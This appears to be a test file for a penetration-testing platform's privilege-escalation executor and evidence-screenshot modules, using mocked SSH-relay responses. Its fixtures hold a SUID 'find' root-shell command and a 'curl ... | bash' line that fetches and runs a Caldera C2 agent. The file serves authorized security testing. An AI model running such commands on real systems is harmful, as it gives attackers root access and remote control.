/**
 * Sprint 11B Part 2 — Privesc Executor + Evidence Screenshot Tests
 *
 * Tests:
 * 1. SUID payload registry completeness and structure
 * 2. executePrivilegeEscalation with mocked SSH relay
 * 3. buildTerminalCapture formatting
 * 4. buildEvidenceScreenshot formatting
 * 5. captureEvidenceScreenshot with evidence chain
 * 6. capturePostExploitScreenshots batch capture
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';

// ─── Mock fetch globally ────────────────────────────────────────────────────
const mockFetch = vi.fn();
vi.stubGlobal('fetch', mockFetch);

describe('Sprint 11B Part 2 — Privesc Executor', () => {
  beforeEach(() => {
    mockFetch.mockReset();
  });

  describe('SUID Payload Registry', () => {
    it('exports SUID_PAYLOADS with all required binaries', async () => {
      const { SUID_PAYLOADS } = await import('./lib/post-exploit/privesc-executor');
      expect(SUID_PAYLOADS).toBeDefined();
      expect(Object.keys(SUID_PAYLOADS).length).toBeGreaterThanOrEqual(10);

      // Must include the most common SUID privesc binaries
      expect(SUID_PAYLOADS['/usr/bin/find']).toBeDefined();
      expect(SUID_PAYLOADS['/usr/bin/python3']).toBeDefined();
      expect(SUID_PAYLOADS['/usr/bin/vim']).toBeDefined();
      expect(SUID_PAYLOADS['/usr/bin/env']).toBeDefined();
      expect(SUID_PAYLOADS['/usr/bin/bash']).toBeDefined();
      expect(SUID_PAYLOADS['/usr/bin/nmap']).toBeDefined();
      expect(SUID_PAYLOADS['/usr/bin/perl']).toBeDefined();
      expect(SUID_PAYLOADS['/usr/bin/pkexec']).toBeDefined();
    });

    it('each payload has required fields', async () => {
      const { SUID_PAYLOADS } = await import('./lib/post-exploit/privesc-executor');
      for (const [binary, payload] of Object.entries(SUID_PAYLOADS)) {
        expect(payload.method, `${binary} missing method`).toBeTruthy();
        expect(payload.exploitCommand, `${binary} missing exploitCommand`).toBeTruthy();
        expect(payload.verifyCommand, `${binary} missing verifyCommand`).toBeTruthy();
        expect(payload.description, `${binary} missing description`).toBeTruthy();
        expect(payload.mitreId, `${binary} missing mitreId`).toMatch(/^T\d{4}/);
        expect(['critical', 'high', 'medium']).toContain(payload.risk);
      }
    });

    it('PASSWD_WRITE_PAYLOAD has correct structure', async () => {
      const { PASSWD_WRITE_PAYLOAD } = await import('./lib/post-exploit/privesc-executor');
      expect(PASSWD_WRITE_PAYLOAD.method).toBe('writable_passwd');
      expect(PASSWD_WRITE_PAYLOAD.exploitCommand).toContain('/etc/passwd');
      expect(PASSWD_WRITE_PAYLOAD.mitreId).toBe('T1136.001');
      expect(PASSWD_WRITE_PAYLOAD.risk).toBe('critical');
    });

    it('CRON_WRITE_PAYLOAD targets writable cron script', async () => {
      const { CRON_WRITE_PAYLOAD } = await import('./lib/post-exploit/privesc-executor');
      expect(CRON_WRITE_PAYLOAD.method).toBe('writable_cron');
      expect(CRON_WRITE_PAYLOAD.exploitCommand).toContain('cleanup.sh');
      expect(CRON_WRITE_PAYLOAD.mitreId).toBe('T1053.003');
    });

    it('SUDO_NOPASSWD_PAYLOAD uses sudo', async () => {
      const { SUDO_NOPASSWD_PAYLOAD } = await import('./lib/post-exploit/privesc-executor');
      expect(SUDO_NOPASSWD_PAYLOAD.method).toBe('sudo_nopasswd');
      expect(SUDO_NOPASSWD_PAYLOAD.exploitCommand).toContain('sudo');
      expect(SUDO_NOPASSWD_PAYLOAD.mitreId).toBe('T1548.003');
    });
  });

  describe('executePrivilegeEscalation', () => {
    it('executes SUID find exploit when detected', async () => {
      const { executePrivilegeEscalation } = await import('./lib/post-exploit/privesc-executor');

      // Mock SSH relay returning successful root shell
      mockFetch.mockResolvedValue({
        ok: true,
        json: async () => ({
          stdout: 'uid=0(root) gid=0(root) groups=0(root)\nPRIVESC_SUCCESS',
          stderr: '',
          exitCode: 0,
        }),
      });

      const ctx = createMockContext();
      const asset = { ip: '10.0.0.5', hostname: 'target-linux', compromisedUser: 'ms3user' };

      const result = await executePrivilegeEscalation(ctx, asset, {
        exploitableSuids: ['/usr/bin/find'],
        writablePasswd: false,
        writableCron: false,
        sudoNopasswd: false,
        kernelVulns: [],
      });

      expect(result.executed).toBe(true);
      expect(result.success).toBe(true);
      expect(result.method).toBe('suid_find');
      expect(result.newLevel).toBe('root');
      expect(result.previousLevel).toBe('user');
      expect(result.terminalCapture).toContain('AC3 Post-Exploitation');
      expect(result.durationMs).toBeGreaterThanOrEqual(0);
    });

    it('tries multiple payloads and stops at first success', async () => {
      const { executePrivilegeEscalation } = await import('./lib/post-exploit/privesc-executor');

      let callCount = 0;
      mockFetch.mockImplementation(async () => {
        callCount++;
        // Call 1: find exploit command → no PRIVESC_SUCCESS in output (fails detection)
        if (callCount === 1) {
          return { ok: true, json: async () => ({ stdout: 'permission denied', stderr: '', exitCode: 1 }) };
        }
        // Call 2+: python3 exploit → succeeds
        return { ok: true, json: async () => ({ stdout: 'uid=0(root) gid=0(root)\nPRIVESC_SUCCESS', stderr: '', exitCode: 0 }) };
      });

      const ctx = createMockContext();
      const asset = { ip: '10.0.0.5', hostname: 'target', compromisedUser: 'user1' };

      const result = await executePrivilegeEscalation(ctx, asset, {
        exploitableSuids: ['/usr/bin/find', '/usr/bin/python3'],
        writablePasswd: false,
        writableCron: false,
        sudoNopasswd: false,
        kernelVulns: [],
      });

      expect(result.executed).toBe(true);
      expect(result.success).toBe(true);
      expect(result.method).toBe('suid_python3');
    });

    it('returns failure when no payloads available', async () => {
      const { executePrivilegeEscalation } = await import('./lib/post-exploit/privesc-executor');

      const ctx = createMockContext();
      const asset = { ip: '10.0.0.5', hostname: 'hardened-box' };

      const result = await executePrivilegeEscalation(ctx, asset, {
        exploitableSuids: [],
        writablePasswd: false,
        writableCron: false,
        sudoNopasswd: false,
        kernelVulns: [],
      });

      expect(result.executed).toBe(false);
      expect(result.success).toBe(false);
      expect(result.method).toBe('none');
      expect(result.newLevel).toBe('user');
    });

    it('tries sudo NOPASSWD when detected', async () => {
      const { executePrivilegeEscalation } = await import('./lib/post-exploit/privesc-executor');

      mockFetch.mockResolvedValue({
        ok: true,
        json: async () => ({
          stdout: 'uid=0(root) gid=0(root) groups=0(root)\nPRIVESC_SUCCESS',
          stderr: '',
          exitCode: 0,
        }),
      });

      const ctx = createMockContext();
      const asset = { ip: '10.0.0.5', hostname: 'sudo-box', compromisedUser: 'devuser' };

      const result = await executePrivilegeEscalation(ctx, asset, {
        exploitableSuids: [],
        writablePasswd: false,
        writableCron: false,
        sudoNopasswd: true,
        kernelVulns: [],
      });

      expect(result.executed).toBe(true);
      expect(result.success).toBe(true);
      expect(result.method).toBe('sudo_nopasswd');
    });

    it('tries writable /etc/passwd when detected', async () => {
      const { executePrivilegeEscalation } = await import('./lib/post-exploit/privesc-executor');

      mockFetch.mockResolvedValue({
        ok: true,
        json: async () => ({
          stdout: 'uid=0(root) gid=0(root)\nPRIVESC_SUCCESS',
          stderr: '',
          exitCode: 0,
        }),
      });

      const ctx = createMockContext();
      const asset = { ip: '10.0.0.5', hostname: 'passwd-box', compromisedUser: 'www-data' };

      const result = await executePrivilegeEscalation(ctx, asset, {
        exploitableSuids: [],
        writablePasswd: true,
        writableCron: false,
        sudoNopasswd: false,
        kernelVulns: [],
      });

      expect(result.executed).toBe(true);
      expect(result.success).toBe(true);
      expect(result.method).toBe('writable_passwd');
    });

    it('records evidence with integrity chain on success', async () => {
      const { executePrivilegeEscalation } = await import('./lib/post-exploit/privesc-executor');

      mockFetch.mockResolvedValue({
        ok: true,
        json: async () => ({
          stdout: 'uid=0(root) PRIVESC_SUCCESS',
          stderr: '',
          exitCode: 0,
        }),
      });

      const ctx = createMockContext();
      const asset = { ip: '10.0.0.5', hostname: 'evidence-test' };

      await executePrivilegeEscalation(ctx, asset, {
        exploitableSuids: ['/usr/bin/env'],
        writablePasswd: false,
        writableCron: false,
        sudoNopasswd: false,
        kernelVulns: [],
      });

      // Verify evidence chain was called
      expect(ctx.evidence.evidenceGate).toHaveBeenCalled();
      expect(ctx.evidence.createIntegrityEnvelope).toHaveBeenCalled();
      expect(ctx.evidence.buildProvenance).toHaveBeenCalledWith('post_exploit', 'system', ctx.operatorCtx);
      expect(ctx.evidence.recordCustodyEvent).toHaveBeenCalled();
    });

    it('records evidence on failure too', async () => {
      const { executePrivilegeEscalation } = await import('./lib/post-exploit/privesc-executor');

      mockFetch.mockResolvedValue({
        ok: true,
        json: async () => ({
          stdout: 'permission denied',
          stderr: 'Operation not permitted',
          exitCode: 1,
        }),
      });

      const ctx = createMockContext();
      const asset = { ip: '10.0.0.5', hostname: 'fail-test', compromisedUser: 'nobody' };

      const result = await executePrivilegeEscalation(ctx, asset, {
        exploitableSuids: ['/usr/bin/env'],
        writablePasswd: false,
        writableCron: false,
        sudoNopasswd: false,
        kernelVulns: [],
      });

      expect(result.success).toBe(false);
      expect(ctx.evidence.evidenceGate).toHaveBeenCalled();
      expect(ctx.evidence.recordCustodyEvent).toHaveBeenCalled();
    });
  });

  describe('buildTerminalCapture', () => {
    it('produces formatted terminal output', async () => {
      const { buildTerminalCapture, SUID_PAYLOADS } = await import('./lib/post-exploit/privesc-executor');
      const asset = { hostname: 'target-01', ip: '10.0.0.5', compromisedUser: 'ms3user' };
      const payload = SUID_PAYLOADS['/usr/bin/find'];
      const output = 'uid=0(root) gid=0(root) groups=0(root)\nPRIVESC_SUCCESS';
      const verifyOutput = 'uid=0(root)';

      const capture = buildTerminalCapture(asset, payload, output, verifyOutput);

      expect(capture).toContain('AC3 Post-Exploitation');
      expect(capture).toContain('target-01');
      expect(capture).toContain('suid_find');
      expect(capture).toContain('T1548.001');
      expect(capture).toContain('ms3user@target-01');
      expect(capture).toContain('PRIVESC_SUCCESS');
      expect(capture).toContain('Privilege escalation successful');
      expect(capture).toContain('CRITICAL');
    });
  });
});

describe('Sprint 11B Part 2 — Evidence Screenshot', () => {
  beforeEach(() => {
    mockFetch.mockReset();
  });

  describe('buildEvidenceScreenshot', () => {
    it('produces text and ansi versions', async () => {
      const { buildEvidenceScreenshot } = await import('./lib/post-exploit/evidence-screenshot');

      const result = buildEvidenceScreenshot({
        type: 'access_verification',
        hostname: 'target-01',
        username: 'root',
        commands: [
          { command: 'id', output: 'uid=0(root) gid=0(root) groups=0(root)' },
          { command: 'whoami', output: 'root' },
        ],
      });

      expect(result.text).toBeDefined();
      expect(result.ansi).toBeDefined();
      expect(result.text).toContain('AC3 Evidence Capture');
      expect(result.text).toContain('Access Verification');
      expect(result.text).toContain('target-01');
      expect(result.text).toContain('uid=0(root)');
      expect(result.text).toContain('whoami');
    });

    it('includes MITRE ATT&CK ID when provided', async () => {
      const { buildEvidenceScreenshot } = await import('./lib/post-exploit/evidence-screenshot');

      const result = buildEvidenceScreenshot({
        type: 'privilege_escalation',
        hostname: 'vuln-box',
        username: 'attacker',
        commands: [{ command: 'exploit', output: 'root shell' }],
        mitreId: 'T1548.001',
      });

      expect(result.text).toContain('T1548.001');
    });

    it('includes annotation when provided', async () => {
      const { buildEvidenceScreenshot } = await import('./lib/post-exploit/evidence-screenshot');

      const result = buildEvidenceScreenshot({
        type: 'agent_deployment',
        hostname: 'c2-target',
        username: 'root',
        commands: [{ command: 'deploy', output: 'agent started' }],
        annotation: 'Sandcat agent deployed successfully',
      });

      expect(result.text).toContain('Sandcat agent deployed');
    });

    it('ANSI version contains escape codes', async () => {
      const { buildEvidenceScreenshot } = await import('./lib/post-exploit/evidence-screenshot');

      const result = buildEvidenceScreenshot({
        type: 'c2_communication',
        hostname: 'beacon-host',
        username: 'root',
        commands: [{ command: 'test', output: 'ok' }],
      });

      // ANSI escape codes present
      expect(result.ansi).toContain('\x1b[');
    });

    it('handles empty output gracefully', async () => {
      const { buildEvidenceScreenshot } = await import('./lib/post-exploit/evidence-screenshot');

      const result = buildEvidenceScreenshot({
        type: 'custom',
        hostname: 'host',
        username: 'user',
        commands: [
          { command: 'silent-cmd', output: '' },
          { command: 'another', output: '  ' },
        ],
      });

      expect(result.text).toContain('silent-cmd');
      expect(result.text).toContain('another');
    });
  });

  describe('captureEvidenceScreenshot', () => {
    it('records evidence with integrity chain', async () => {
      const { captureEvidenceScreenshot } = await import('./lib/post-exploit/evidence-screenshot');

      // Mock PNG render failure (expected — no scan server)
      mockFetch.mockRejectedValue(new Error('no scan server'));

      const ctx = createMockContext();
      const result = await captureEvidenceScreenshot(ctx, {
        type: 'access_verification',
        hostname: 'test-host',
        username: 'root',
        commands: [{ command: 'id', output: 'uid=0(root)' }],
        renderPng: false,
      });

      expect(result.id).toBeTruthy();
      expect(result.type).toBe('access_verification');
      expect(result.textContent).toContain('test-host');
      expect(result.ansiContent).toContain('\x1b[');
      expect(result.hostname).toBe('test-host');
      expect(result.capturedAt).toBeGreaterThan(0);

      // Evidence chain called
      expect(ctx.evidence.evidenceGate).toHaveBeenCalled();
      expect(ctx.evidence.createIntegrityEnvelope).toHaveBeenCalled();
      expect(ctx.evidence.recordCustodyEvent).toHaveBeenCalled();
    });

    it('attempts PNG render when requested', async () => {
      const { captureEvidenceScreenshot } = await import('./lib/post-exploit/evidence-screenshot');

      // Mock successful render
      mockFetch.mockResolvedValue({
        ok: true,
        json: async () => ({ stdout: 'RENDER_SUCCESS:/tmp/evidence-test.png', stderr: '' }),
      });

      const ctx = createMockContext();
      const result = await captureEvidenceScreenshot(ctx, {
        type: 'privilege_escalation',
        hostname: 'render-test',
        username: 'attacker',
        commands: [{ command: 'exploit', output: 'root' }],
        renderPng: true,
      });

      expect(result.textContent).toContain('render-test');
      // fetch was called for render attempt
      expect(mockFetch).toHaveBeenCalled();
    });
  });

  describe('capturePostExploitScreenshots', () => {
    it('captures batch of screenshots for full session', async () => {
      const { capturePostExploitScreenshots } = await import('./lib/post-exploit/evidence-screenshot');

      mockFetch.mockRejectedValue(new Error('no render'));

      const ctx = createMockContext();
      const asset = { ip: '10.0.0.5', hostname: 'full-chain-target', compromisedUser: 'ms3user' };

      const results = await capturePostExploitScreenshots(ctx, asset, {
        accessVerification: { idOutput: 'uid=1000(ms3user) gid=1000(ms3user)', level: 'user' },
        privescExecution: {
          method: 'suid_find',
          command: 'find / -exec /bin/sh \\;',
          output: 'uid=0(root)',
          mitreId: 'T1548.001',
        },
        agentDeployment: {
          agentPaw: 'full-chain-target-12345',
          deployCommand: 'curl http://caldera/file/download | bash',
          output: 'Agent started with PID 1234',
        },
        c2Communication: {
          operationName: 'test-op',
          abilities: [
            { name: 'whoami', output: 'root' },
            { name: 'hostname', output: 'full-chain-target' },
          ],
        },
      });

      expect(results.length).toBe(4);
      expect(results[0].type).toBe('access_verification');
      expect(results[1].type).toBe('privilege_escalation');
      expect(results[2].type).toBe('agent_deployment');
      expect(results[3].type).toBe('c2_communication');

      // All have evidence IDs
      for (const shot of results) {
        expect(shot.evidenceId).toBeTruthy();
        expect(shot.hostname).toBe('full-chain-target');
      }
    });

    it('handles partial session data (only access verification)', async () => {
      const { capturePostExploitScreenshots } = await import('./lib/post-exploit/evidence-screenshot');

      mockFetch.mockRejectedValue(new Error('no render'));

      const ctx = createMockContext();
      const asset = { ip: '10.0.0.5', hostname: 'partial-target' };

      const results = await capturePostExploitScreenshots(ctx, asset, {
        accessVerification: { idOutput: 'uid=0(root) gid=0(root)', level: 'root' },
      });

      expect(results.length).toBe(1);
      expect(results[0].type).toBe('access_verification');
    });

    it('handles empty session data', async () => {
      const { capturePostExploitScreenshots } = await import('./lib/post-exploit/evidence-screenshot');

      const ctx = createMockContext();
      const asset = { ip: '10.0.0.5', hostname: 'empty-target' };

      const results = await capturePostExploitScreenshots(ctx, asset, {});

      expect(results.length).toBe(0);
    });
  });
});

describe('Sprint 11B Part 2 — Test Lab Infrastructure', () => {
  it('cloud-init-linux.yaml exists and has C2 connectivity section', async () => {
    const fs = await import('fs');
    const content = fs.readFileSync(
      new URL('../infrastructure/test-lab/cloud-init-linux.yaml', import.meta.url),
      'utf-8'
    );
    expect(content).toContain('#cloud-config');
    expect(content).toContain('caldera-agents');
    expect(content).toContain('C2');
  });

  it('cloud-init-windows-equiv.yaml exists and has SMB/RDP/WinRM services', async () => {
    const fs = await import('fs');
    const content = fs.readFileSync(
      new URL('../infrastructure/test-lab/cloud-init-windows-equiv.yaml', import.meta.url),
      'utf-8'
    );
    expect(content).toContain('#cloud-config');
    expect(content).toContain('samba');
    expect(content).toContain('xrdp');
    expect(content).toContain('winrm-sim');
    expect(content).toContain('5985');
    expect(content).toContain('administrator');
  });

  it('deploy-test-lab.sh has firewall rules for scan server', async () => {
    const fs = await import('fs');
    const content = fs.readFileSync(
      new URL('../infrastructure/test-lab/deploy-test-lab.sh', import.meta.url),
      'utf-8'
    );
    expect(content).toContain('firewall');
    expect(content).toContain('ac3-test-lab');
  });
});

// ─── Test Helpers ───────────────────────────────────────────────────────────

function createMockContext(): any {
  return {
    state: { engagementId: 'test-eng-001', logs: [], evidence: [] },
    engagement: { id: 'test-eng-001', targets: [] },
    operatorCtx: { id: 'test-operator', name: 'Test' },
    scanServerHost: '127.0.0.1',
    helpers: {
      addLog: vi.fn(),
      broadcastOpsUpdate: vi.fn(),
      requestApproval: vi.fn().mockResolvedValue({ approved: true }),
      auditLog: vi.fn(),
      getEffectiveTarget: vi.fn((a: any) => a.ip || a.hostname),
      fmtTarget: vi.fn((a: any) => a.hostname || a.ip),
      genId: vi.fn(() => `eid-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`),
    },
    evidence: {
      evidenceGate: vi.fn().mockResolvedValue(undefined),
      createIntegrityEnvelope: vi.fn().mockReturnValue({ hash: 'sha256:test', timestamp: Date.now() }),
      buildProvenance: vi.fn().mockReturnValue({ phase: 'post_exploit', tool: 'system' }),
      recordCustodyEvent: vi.fn(),
    },
  };
}
